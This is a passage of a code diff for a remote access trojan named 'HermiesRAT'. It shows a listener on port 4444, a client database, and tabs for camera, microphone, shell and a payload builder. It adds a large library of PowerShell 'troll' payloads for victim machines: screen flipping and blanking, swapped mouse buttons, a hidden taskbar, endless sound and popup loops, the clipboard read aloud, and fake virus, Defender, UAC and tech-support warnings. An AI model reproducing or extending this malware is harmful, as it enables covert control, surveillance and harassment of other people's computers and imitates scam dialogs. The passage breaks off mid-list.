@@ -1,4 +1,4 @@
-# 
+#
 #  HermiesRAT-Bata-1.
 #  Structure:
 #    [IMPORTS]           stdlib + third-party imports
@@ -20,7 +20,7 @@
 #      _build_camera_tab
 #      _build_task_tab
 #      _build_files_tab
-#      _build_scripts_tab   <-- PLACEHOLDER <noT WORKIN>
+#      _build_payloadCenter  
 #      _build_builder_tab
 #      _build_shell_tab
 #      _build_mic_tab
@@ -28,9 +28,9 @@
 #      _build_settings_tab
 #      _build_custom_tab
 #    [ENTRYPOINT]        __main__ block
-# 
+#
 
-#  [IMPORTS] 
+#  [IMPORTS]
 import shlex
 import socket, threading, os, json, struct, base64, io, time, hmac, hashlib, secrets, ast, sqlite3
 import tkinter as tk
@@ -38,13 +38,14 @@ from tkinter import ttk, filedialog, scrolledtext, messagebox, colorchooser
 from PIL import Image, ImageTk
 
 
-#  [CONFIG / GLOBALS] 
+#  [CONFIG / GLOBALS]
 HOST = "0.0.0.0"
 PORT = 4444
 CHUNK = 65536
 
 CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hermies_config.json")
-DB_PATH_DEFAULT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hermies_clients.db")
+DB_PATH_DEFAULT    = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hermies_clients.db")
+PAYLOADS_FILE      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hermies_payloads.json")
 
 SHARED_SECRET = b""
 AUTH_TIMEOUT  = 10
@@ -52,7 +53,7 @@ AUTH_TIMEOUT  = 10
 _config = {}
 
 
-#  [CONFIG] 
+#  [CONFIG]
 def _load_config():
     global SHARED_SECRET, _config, _active_secret
     if os.path.exists(CONFIG_FILE):
@@ -78,7 +79,32 @@ def _save_config():
         print(f"[config] save error: {e}")
 
 
-#  [DATABASE] 
+#  [PAYLOAD CENTER] 
+_payload_library = []   # list of dicts: {name, shell, tags, code}
+
+def _pc_load():
+    global _payload_library
+    if os.path.exists(PAYLOADS_FILE):
+        try:
+            with open(PAYLOADS_FILE, "r", encoding="utf-8") as fh:
+                data = json.load(fh)
+            if isinstance(data, list):
+                _payload_library = data
+                print(f"[payloads] loaded {len(_payload_library)} payload(s) from {PAYLOADS_FILE}")
+                return
+        except Exception as e:
+            print(f"[payloads] load error: {e}")
+    _payload_library = []
+
+def _pc_save():
+    try:
+        with open(PAYLOADS_FILE, "w", encoding="utf-8") as fh:
+            json.dump(_payload_library, fh, indent=2)
+    except Exception as e:
+        print(f"[payloads] save error: {e}")
+
+
+#  [DATABASE]
 _db_conn = None
 
 def _db_init(path):
@@ -161,7 +187,7 @@ def _db_update_note(ip, note):
         print(f"[db] note error: {e}")
 
 
-#  [MODULES] ─
+#  [MODULES] 
 MODULE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "src", "command", "modules")
 _loaded_modules = {}
 
@@ -222,7 +248,7 @@ def _build_module_injection(selected_names):
     return "\n".join(parts)
 
 
-#  [SCRIPTS] ─
+#  [SCRIPTS] 
 SCRIPT_BASE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "src", "modules")
 _EXT_SHELL = {".ps1": "powershell", ".sh": "bash", ".bat": "cmd"}
 
@@ -252,7 +278,7 @@ def _scan_scripts():
     return result
 
 
-#  [THEME] ─
+#  [THEME] 
 THEME_PRESETS = {
     "orange": {
         "BG": "#0f0f0f", "BG2": "#1a1a1a", "BG3": "#242424", "BG4": "#2e2e2e",
@@ -319,176 +345,511 @@ STARS_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "src", "icons", "background", "stars.png")
 
 
-#  [TROLL_PAYLOADS] 
-TROLL_PAYLOADS = [
-    ("eject cd",      "powershell",
-     "(New-Object -ComObject Shell.Application).NameSpace(17).Items()|"
-     "?{$_.Type -eq 'CD Drive'}|%{$_.InvokeVerb('E&ject')}"),
+#  [TROLL_PAYLOADS]  categorized dict  {category: [(label, shell, cmd), ...]}
+_DEVMODE_TYPE = (
+    "$code=@'\n"
+    "using System;using System.Runtime.InteropServices;\n"
+    "public struct DEVMODE{"
+    "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;"
+    "public short dmSpecVersion,dmDriverVersion,dmSize,dmDriverExtra;public int dmFields;"
+    "public int dmPositionX,dmPositionY,dmDisplayOrientation;public int dmDisplayFixedOutput;"
+    "public short dmColor,dmDuplex,dmYResolution,dmTTOption,dmCollate;"
+    "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;"
+    "public short dmLogPixels;"
+    "public int dmBitsPerPel,dmPelsWidth,dmPelsHeight,dmDisplayFlags,dmDisplayFrequency;}\n"
+    "public class Disp{"
+    "[DllImport(\"user32.dll\")]public static extern bool EnumDisplaySettings(string d,int m,ref DEVMODE dm);"
+    "[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE dm,int f);}\n"
+    "'@\nAdd-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
+    "$dm=New-Object DEVMODE;"
+    "$dm.dmSize=[System.Runtime.InteropServices.Marshal]::SizeOf($dm);"
+    "[Disp]::EnumDisplaySettings($null,-1,[ref]$dm);"
+)
+_COLMAT_TYPE = (
+    "$code=@'\n"
+    "using System;using System.Runtime.InteropServices;\n"
+    "public struct ColorMatrix{public float m00,m01,m02,m03,m04,m10,m11,m12,m13,m14,"
+    "m20,m21,m22,m23,m24,m30,m31,m32,m33,m34,m40,m41,m42,m43,m44;}\n"
+    "public class Mag{"
+    "[DllImport(\"magnification.dll\")]public static extern bool MagInitialize();"
+    "[DllImport(\"magnification.dll\")]"
+    "public static extern bool MagSetFullscreenColorEffect(ref ColorMatrix m);}\n"
+    "'@\nAdd-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
+    "[Mag]::MagInitialize()|Out-Null;$m=New-Object ColorMatrix;"
+)
 
-    ("swap mouse",    "powershell",
-     "$sig='[DllImport(\"user32.dll\")]public static extern bool SwapMouseButton(bool b);';"
-     "Add-Type -MemberDefinition $sig -Name M -Namespace W -ErrorAction SilentlyContinue;"
-     "[W.M]::SwapMouseButton($true)|Out-Null"),
-    ("unswap mouse",  "powershell",
-     "$sig='[DllImport(\"user32.dll\")]public static extern bool SwapMouseButton(bool b);';"
-     "Add-Type -MemberDefinition $sig -Name M -Namespace W -ErrorAction SilentlyContinue;"
-     "[W.M]::SwapMouseButton($false)|Out-Null"),
+TROLL_PAYLOADS = {
+    "🔊  Audio": [
+        ("beep",              "powershell",
+         "[console]::beep(1000,500)"),
+        ("exclamation wav",   "powershell",
+         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Exclamation.wav').PlaySync()"),
+        ("critical stop x10", "powershell",
+         "1..10|%{(New-Object Media.SoundPlayer"
+         " 'C:\\Windows\\Media\\Windows Critical Stop.wav').PlaySync();Start-Sleep 2}"),
+        ("ding",              "powershell",
+         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Ding.wav').PlaySync()"),
+        ("logon sound",       "powershell",
+         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Logon.wav').PlaySync()"),
+        ("random wav loop",   "powershell",
+         "while($true){$w=(Get-ChildItem 'C:\\Windows\\Media\\*.wav'|Get-Random).FullName;"
+         "(New-Object Media.SoundPlayer $w).PlaySync();Start-Sleep 5}"),
+        ("siren loop",        "powershell",
+         "while($true){[console]::beep(1200,200);[console]::beep(600,200)}"),
+        ("beep on the minute","powershell",
+         "while($true){$s=60-(Get-Date).Second;Start-Sleep $s;[console]::beep(2000,1000)}"),
+        ("rickroll beep",     "powershell",
+         "foreach($n in 523,523,523,523,587,659,587,523,587,659,523)"
+         "{[console]::beep($n,200);Start-Sleep -Milliseconds 50}"),
+        ("mute toggle",       "powershell",
+         "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"),
+        ("max volume",        "powershell",
+         "$sig='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte k,byte s,int f,int e);';"
+         "Add-Type -MemberDefinition $sig -Name V -Namespace W -ErrorAction SilentlyContinue;"
+         "1..50|%{[W.V]::keybd_event(0xAF,0,0,0);[W.V]::keybd_event(0xAF,0,2,0);"
+         "Start-Sleep -Milliseconds 30}"),
+        ("min volume",        "powershell",
+         "$sig='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte k,byte s,int f,int e);';"
+         "Add-Type -MemberDefinition $sig -Name V -Namespace W -ErrorAction SilentlyContinue;"
+         "1..50|%{[W.V]::keybd_event(0xAE,0,0,0);[W.V]::keybd_event(0xAE,0,2,0);"
+         "Start-Sleep -Milliseconds 30}"),
+        ("vol toggle x20",    "powershell",
+         "$o=New-Object -ComObject WScript.Shell;"
+         "1..20|%{$o.SendKeys([char]173);Start-Sleep -Milliseconds 50}"),
+        ("speak hello",       "powershell",
+         "(New-Object -ComObject SAPI.SpVoice).Speak('Hello there')"),
+        ("speak creepy",      "powershell",
+         "$v=New-Object -ComObject SAPI.SpVoice;$v.Rate=-5;$v.Speak('I see you')"),
+        ("speak full vol",    "powershell",
+         "$v=New-Object -ComObject SAPI.SpVoice;$v.Volume=100;$v.Speak('Look behind you')"),
+        ("speak username",    "powershell",
+         "(New-Object -ComObject SAPI.SpVoice).Speak('Hello '+$env:USERNAME)"),
+        ("speak time loop",   "powershell",
+         "while($true){(New-Object -ComObject SAPI.SpVoice).Speak("
+         "(Get-Date).ToString('h:mm tt'));Start-Sleep 60}"),
+        ("speak random loop", "powershell",
+         "$p=@('hello','what are you doing','boo','did you hear that','I am watching');"
+         "while($true){(New-Object -ComObject SAPI.SpVoice).Speak($p|Get-Random);"
+         "Start-Sleep (Get-Random -Min 10 -Max 30)}"),
+        ("speak processes",   "powershell",
+         "Get-Process|%{(New-Object -ComObject SAPI.SpVoice).Speak($_.ProcessName);Start-Sleep 1}"),
+        ("speak clipboard",   "powershell",
+         "$v=New-Object -ComObject SAPI.SpVoice;$v.Speak([string](Get-Clipboard))"),
+        ("popup watch msg",   "powershell",
+         "Add-Type -AssemblyName System.Windows.Forms;"
+         "1..10|%{[System.Windows.Forms.MessageBox]::Show("
+         "'Hello. I have been watching you. You should close some of those tabs.','...',"
+         "[System.Windows.Forms.MessageBoxButtons]::OK,"
+         "[System.Windows.Forms.MessageBoxIcon]::Warning)|Out-Null}"),
+    ],
 
-    ("flip screen",   "powershell",
-     "$code=@'\n"
-     "using System;using System.Runtime.InteropServices;\n"
-     "public struct DEVMODE{[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;"
-     "public short dmSpecVersion,dmDriverVersion,dmSize,dmDriverExtra;public int dmFields;"
-     "public int dmPositionX,dmPositionY,dmDisplayOrientation;public int dmDisplayFixedOutput;"
-     "public short dmColor,dmDuplex,dmYResolution,dmTTOption,dmCollate;"
-     "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;"
-     "public short dmLogPixels;public int dmBitsPerPel,dmPelsWidth,dmPelsHeight,dmDisplayFlags,dmDisplayFrequency;}\n"
-     "public class Disp{[DllImport(\"user32.dll\")]public static extern bool EnumDisplaySettings(string d,int m,ref DEVMODE dm);"
-     "[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE dm,int f);}\n"
-     "'@\n"
-     "Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
-     "$dm=New-Object DEVMODE;"
-     "$dm.dmSize=[System.Runtime.InteropServices.Marshal]::SizeOf($dm);"
-     "[Disp]::EnumDisplaySettings($null,-1,[ref]$dm);"
-     "$dm.dmFields=0x80;$dm.dmDisplayOrientation=2;"
-     "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
-    ("unflip screen", "powershell",
-     "$code=@'\n"
-     "using System;using System.Runtime.InteropServices;\n"
-     "public struct DEVMODE{[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;"
-     "public short dmSpecVersion,dmDriverVersion,dmSize,dmDriverExtra;public int dmFields;"
-     "public int dmPositionX,dmPositionY,dmDisplayOrientation;public int dmDisplayFixedOutput;"
-     "public short dmColor,dmDuplex,dmYResolution,dmTTOption,dmCollate;"
-     "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;"
-     "public short dmLogPixels;public int dmBitsPerPel,dmPelsWidth,dmPelsHeight,dmDisplayFlags,dmDisplayFrequency;}\n"
-     "public class Disp{[DllImport(\"user32.dll\")]public static extern bool EnumDisplaySettings(string d,int m,ref DEVMODE dm);"
-     "[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE dm,int f);}\n"
-     "'@\n"
-     "Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
-     "$dm=New-Object DEVMODE;"
-     "$dm.dmSize=[System.Runtime.InteropServices.Marshal]::SizeOf($dm);"
-     "[Disp]::EnumDisplaySettings($null,-1,[ref]$dm);"
-     "$dm.dmFields=0x80;$dm.dmDisplayOrientation=0;"
-     "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
+    "🖼  Wallpaper": [
+        ("random wallpaper",  "powershell",
+         "$img=(Get-ChildItem 'C:\\Windows\\Web\\Wallpaper'"
+         " -Recurse -Include *.jpg,*.png|Get-Random).FullName;"
+         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;"
+         "public class WP{[DllImport(\"user32.dll\")]"
+         "public static extern int SystemParametersInfo(int u,int w,string p,int f);}'"
+         " -EA SilentlyContinue;[WP]::SystemParametersInfo(20,0,$img,3)"),
+        ("rotate wallpaper",  "powershell",
+         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;"
+         "public class WPR{[DllImport(\"user32.dll\")]"
+         "public static extern int SystemParametersInfo(int u,int w,string p,int f);}'"
+         " -EA SilentlyContinue;"
+         "while($true){$i=(Get-ChildItem 'C:\\Windows\\Web\\Wallpaper'"
+         " -Recurse -Include *.jpg,*.png|Get-Random).FullName;"
+         "[WPR]::SystemParametersInfo(20,0,$i,3);Start-Sleep 10}"),
+        ("restore wallpaper", "powershell",
+         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;"
+         "public class WPX{[DllImport(\"user32.dll\")]"
+         "public static extern int SystemParametersInfo(int u,int w,string p,int f);}'"
+         " -EA SilentlyContinue;"
+         "[WPX]::SystemParametersInfo(20,0,"
+         "'C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg',3)"),
+        ("tile wallpaper",    "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name WallpaperStyle -Value '0';"
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name TileWallpaper -Value '1'"),
+        ("stretch wallpaper", "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name WallpaperStyle -Value '2';"
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name TileWallpaper -Value '0'"),
+        ("giant icons",       "powershell",
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop'"
+         " -Name IconSize -Value 256"),
+        ("restore icons",     "powershell",
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop'"
+         " -Name IconSize -Value 48"),
+        ("bubbles screensaver","powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop'"
+         " -Name SCRNSAVE.EXE -Value 'C:\\Windows\\System32\\Bubbles.scr';"
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop'"
+         " -Name ScreenSaveTimeOut -Value '60'"),
+        ("disable screensaver","powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name SCRNSAVE.EXE -Value ''"),
+    ],
 
-    ("spam notepad",  "powershell",
-     "1..20|%{Start-Process notepad.exe;Start-Sleep -Milliseconds 200}"),
+    "🖱  Cursor": [
+        ("swap mouse",        "powershell",
+         "$sig='[DllImport(\"user32.dll\")]public static extern bool SwapMouseButton(bool b);';"
+         "Add-Type -MemberDefinition $sig -Name M -Namespace W -ErrorAction SilentlyContinue;"
+         "[W.M]::SwapMouseButton($true)|Out-Null"),
+        ("unswap mouse",      "powershell",
+         "$sig='[DllImport(\"user32.dll\")]public static extern bool SwapMouseButton(bool b);';"
+         "Add-Type -MemberDefinition $sig -Name M -Namespace W -ErrorAction SilentlyContinue;"
+         "[W.M]::SwapMouseButton($false)|Out-Null"),
+        ("move cursor",       "powershell",
+         "$sig='[DllImport(\"user32.dll\")]public static extern bool SetCursorPos(int x,int y);';"
+         "Add-Type -MemberDefinition $sig -Name C -Namespace W -ErrorAction SilentlyContinue;"
+         "1..100|%{[W.C]::SetCursorPos((Get-Random -Max 1920),(Get-Random -Max 1080));"
+         "Start-Sleep -Milliseconds 100}"),
+        ("random clicks",     "powershell",
+         "$sig='[DllImport(\"user32.dll\")]"
+         "public static extern void mouse_event(int f,int x,int y,int d,int e);';"
+         "Add-Type -MemberDefinition $sig -Name M2 -Namespace W -ErrorAction SilentlyContinue;"
+         "1..30|%{[W.M2]::mouse_event(2,0,0,0,0);[W.M2]::mouse_event(4,0,0,0,0);"
+         "Start-Sleep -Milliseconds 500}"),
+        ("max speed",         "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseSensitivity -Value '20'"),
+        ("min speed",         "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseSensitivity -Value '1'"),
+        ("restore speed",     "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseSensitivity -Value '10'"),
+        ("trails on",         "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseTrails -Value '7'"),
+        ("trails off",        "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseTrails -Value '0'"),
+        ("slowest dbl-click", "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name DoubleClickSpeed -Value '900'"),
+        ("fastest dbl-click", "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name DoubleClickSpeed -Value '100'"),
+        ("restore dbl-click", "powershell",
+         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name DoubleClickSpeed -Value '500'"),
+    ],
 
-    ("wall of text",  "powershell",
-     "$w=(New-Object -ComObject WScript.Shell);1..200|%{$w.SendKeys('ALL YOUR BASE ARE BELONG TO US ')}"),
+    "💬  Popups": [
+        ("spam notepad",      "powershell",
+         "1..20|%{Start-Process notepad.exe;Start-Sleep -Milliseconds 200}"),
+        ("10 calculators",    "powershell",
+         "1..10|%{Start-Process calc;Start-Sleep -Milliseconds 300}"),
+        ("open task manager", "powershell",
+         "Start-Process taskmgr"),
+        ("open osk",          "powershell",
+         "Start-Process osk"),
+        ("open magnifier",    "powershell",
+         "Start-Process magnify"),
+        ("10 file explorers", "powershell",
+         "1..10|%{Start-Process explorer;Start-Sleep -Milliseconds 200}"),
+        ("open URLs",         "powershell",
+         "'https://www.youtube.com/watch?v=dQw4w9WgXcQ',"
+         "'https://neal.fun/infinite-craft/',"
+         "'https://www.bing.com/search?q=am+i+hacked'|%{Start-Process $_}"),
+        ("msgbox(1-800)",     "powershell",
+         "Add-Type -AssemblyName System.Windows.Forms;"
+         "[System.Windows.Forms.MessageBox]::Show("
+         "'Your computer has a virus. Please call 1-800-HACKED immediately.','WARNING',"
+         "[System.Windows.Forms.MessageBoxButtons]::OK,"
+         "[System.Windows.Forms.MessageBoxIcon]::Error)"),
+        ("fake restart msg",  "powershell",
+         "Add-Type -AssemblyName PresentationFramework;"
+         "[System.Windows.MessageBox]::Show("
+         "'The system has detected a problem and must restart.','Error',0)"),
+        ("fake Defender",     "powershell",
+         "Add-Type -AssemblyName PresentationFramework;"
+         "[System.Windows.MessageBox]::Show("
+         "'Windows Defender found 3 threats.','Security Warning',48)"),
+        ("fake update",       "powershell",
+         "Add-Type -AssemblyName PresentationFramework;"
+         "[System.Windows.MessageBox]::Show("
+         "'Windows is updating. Do not turn off your computer.','Windows Update')"),
+        ("fake UAC",          "powershell",
+         "Add-Type -AssemblyName PresentationFramework;"
+         "[System.Windows.MessageBox]::Show("
+         "'Do you want to allow this app to make changes to your device?',"
+         "'User Account Control')"),
+        ("popup every 5 min", "powershell",
+         "Add-Type -AssemblyName PresentationFramework;"
+         "while($true){[System.Windows.MessageBox]::Show("
+         "(@('Hi','Boo','Look','Troll','Did you hear that?')|Get-Random),'Surprise');"
+         "Start-Sleep 300}"),
+    ],
 
-    ("max volume",    "powershell",
-     "$sig='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte k,byte s,int f,int e);';"
-     "Add-Type -MemberDefinition $sig -Name V -Namespace W -ErrorAction SilentlyContinue;"
-     "1..50|%{[W.V]::keybd_event(0xAF,0,0,0);[W.V]::keybd_event(0xAF,0,2,0);Start-Sleep -Milliseconds 30}"),
-    ("min volume",    "powershell",
-     "$sig='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte k,byte s,int f,int e);';"
-     "Add-Type -MemberDefinition $sig -Name V -Namespace W -ErrorAction SilentlyContinue;"
-     "1..50|%{[W.V]::keybd_event(0xAE,0,0,0);[W.V]::keybd_event(0xAE,0,2,0);Start-Sleep -Milliseconds 30}"),
+    "⌨  Keyboard": [
+        ("wall of text",      "powershell",
+         "$w=(New-Object -ComObject WScript.Shell);"
+         "1..200|%{$w.SendKeys('ALL YOUR BASE ARE BELONG TO US ')}"),
+        ("typing 'help'",     "powershell",
+         "$w=(New-Object -ComObject WScript.Shell);Start-Sleep 2;"
+         "foreach($c in 'PLEASE SEND HELP I AM TRAPPED IN THIS COMPUTER'.ToCharArray()){"
+         "$w.SendKeys($c.ToString());Start-Sleep -Milliseconds 80}"),
+        ("caps lock spam",    "powershell",
+         "$w=(New-Object -ComObject WScript.Shell);"
+         "1..20|%{$w.SendKeys('{CAPSLOCK}');Start-Sleep -Milliseconds 300}"),
+        ("type lol x100",     "powershell",
+         "$w=(New-Object -ComObject WScript.Shell);"
+         "1..100|%{$w.SendKeys('lol ');Start-Sleep -Milliseconds 100}"),
+        ("type current time", "powershell",
+         "Add-Type -AssemblyName System.Windows.Forms;"
+         "[System.Windows.Forms.SendKeys]::SendWait((Get-Date).ToString('h:mm tt'))"),
+        ("press Enter loop",  "powershell",
+         "Add-Type -AssemblyName System.Windows.Forms;"
+         "while($true){[System.Windows.Forms.SendKeys]::SendWait('{ENTER}');Start-Sleep 2}"),
+        ("press F5 loop",     "powershell",
+         "Add-Type -AssemblyName System.Windows.Forms;"
+         "while($true){[System.Windows.Forms.SendKeys]::SendWait('{F5}');Start-Sleep 3}"),
+        ("press Escape loop", "powershell",
+         "Add-Type -AssemblyName System.Windows.Forms;"
+         "while($true){[System.Windows.Forms.SendKeys]::SendWait('{ESC}');Start-Sleep 2}"),
+        ("lock workstation",  "cmd",
+         "rundll32 user32.dll,LockWorkStation"),
+    ],
 
-    ("taskbar hide",  "powershell",
-     "$sig='[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);"
-     "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);';"
-     "Add-Type -MemberDefinition $sig -Name W -Namespace W -ErrorAction SilentlyContinue;"
-     "$h=[W.W]::FindWindow('Shell_TrayWnd',$null);[W.W]::ShowWindow($h,0)"),
-    ("taskbar show",  "powershell",
-     "$sig='[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);"
-     "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);';"
-     "Add-Type -MemberDefinition $sig -Name W -Namespace W -ErrorAction SilentlyContinue;"
-     "$h=[W.W]::FindWindow('Shell_TrayWnd',$null);[W.W]::ShowWindow($h,5)"),
+    "🖥  Screen": [
+        ("flip screen",       "powershell",
+         _DEVMODE_TYPE +
+         "$dm.dmFields=0x80;$dm.dmDisplayOrientation=2;"
+         "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
+        ("unflip screen",     "powershell",
+         _DEVMODE_TYPE +
+         "$dm.dmFields=0x80;$dm.dmDisplayOrientation=0;"
+         "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
+        ("flip 90°",          "powershell",
+         _DEVMODE_TYPE +
+         "$dm.dmFields=0x80;$dm.dmDisplayOrientation=1;"
+         "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
+        ("flip/unflip loop",  "powershell",
+         _DEVMODE_TYPE +
+         "while($true){$dm.dmFields=0x80;$dm.dmDisplayOrientation=2;"
+         "[Disp]::ChangeDisplaySettings([ref]$dm,0);Start-Sleep 5;"
+         "$dm.dmDisplayOrientation=0;"
+         "[Disp]::ChangeDisplaySettings([ref]$dm,0);Start-Sleep 5}"),
+        ("invert colors",     "powershell",
+         _COLMAT_TYPE +
+         "$m.m00=-1;$m.m11=-1;$m.m22=-1;$m.m33=1;$m.m44=1;"
+         "$m.m04=1;$m.m14=1;$m.m24=1;"
+         "[Mag]::MagSetFullscreenColorEffect([ref]$m)"),
+        ("uninvert colors",   "powershell",
+         _COLMAT_TYPE +
+         "$m.m00=1;$m.m11=1;$m.m22=1;$m.m33=1;$m.m44=1;"
+         "[Mag]::MagSetFullscreenColorEffect([ref]$m)"),
+        ("high contrast on",  "powershell",
+         "Set-ItemProperty"
+         " 'HKCU:\\Control Panel\\Accessibility\\HighContrast' -Name Flags -Value '126'"),
+        ("high contrast off", "powershell",
+         "Set-ItemProperty"
+         " 'HKCU:\\Control Panel\\Accessibility\\HighContrast' -Name Flags -Value '0'"),
+        ("brightness 0",      "powershell",
+         "(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods)"
+         ".WmiSetBrightness(1,0)"),
+        ("brightness 100",    "powershell",
+         "(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods)"
+         ".WmiSetBrightness(1,100)"),
+        ("brightness 50",     "powershell",
+         "(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods)"
+         ".WmiSetBrightness(1,50)"),
+        ("blink screen",      "powershell",
+         "$b=(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods);"
+         "while($true){$b.WmiSetBrightness(1,0);Start-Sleep -Milliseconds 500;"
+         "$b.WmiSetBrightness(1,100);Start-Sleep -Milliseconds 500}"),
+        ("screen off",        "powershell",
+         "$sig='[DllImport(\"user32.dll\")]"
+         "public static extern int SendMessage(int h,int m,int w,int l);';"
+         "Add-Type -MemberDefinition $sig -Name SM -Namespace W -EA SilentlyContinue;"
+         "[W.SM]::SendMessage(0xFFFF,0x0112,0xF170,2)"),
+        ("toggle magnifier",  "powershell",
+         "while($true){Start-Process magnify;Start-Sleep 10;"
+         "Stop-Process -Name Magnify -EA SilentlyContinue;Start-Sleep 10}"),
+    ],
 
-    ("open URLs",     "powershell",
-     "'https://www.youtube.com/watch?v=dQw4w9WgXcQ',"
-     "'https://neal.fun/infinite-craft/',"
-     "'https://www.bing.com/search?q=am+i+hacked'|%{Start-Process $_}"),
+    "📋  Taskbar": [
+        ("taskbar hide",      "powershell",
+         "$sig='[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);"
+         "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);';"
+         "Add-Type -MemberDefinition $sig -Name TW -Namespace W -ErrorAction SilentlyContinue;"
+         "$h=[W.TW]::FindWindow('Shell_TrayWnd',$null);[W.TW]::ShowWindow($h,0)"),
+        ("taskbar show",      "powershell",
+         "$sig='[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);"
+         "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);';"
+         "Add-Type -MemberDefinition $sig -Name TW -Namespace W -ErrorAction SilentlyContinue;"
+         "$h=[W.TW]::FindWindow('Shell_TrayWnd',$null);[W.TW]::ShowWindow($h,5)"),
+        ("taskbar top",       "powershell",
+         "$b=[byte[]](0x30,0,0,0,0xFE,0xFF,0xFF,0xFF,0x03,0,0,0,0x03,0,0,0,"
+         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
+         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);"
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3'"
+         " -Name Settings -Value $b"),
+        ("taskbar bottom",    "powershell",
+         "$b=[byte[]](0x30,0,0,0,0xFE,0xFF,0xFF,0xFF,0x02,0,0,0,0x03,0,0,0,"
+         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
+         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);"
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3'"
+         " -Name Settings -Value $b"),
+        ("taskbar left",      "powershell",
+         "$b=[byte[]](0x30,0,0,0,0xFE,0xFF,0xFF,0xFF,0x00,0,0,0,0x03,0,0,0,"
+         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
+         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);"
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3'"
+         " -Name Settings -Value $b"),
+        ("small icons",       "powershell",
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'"
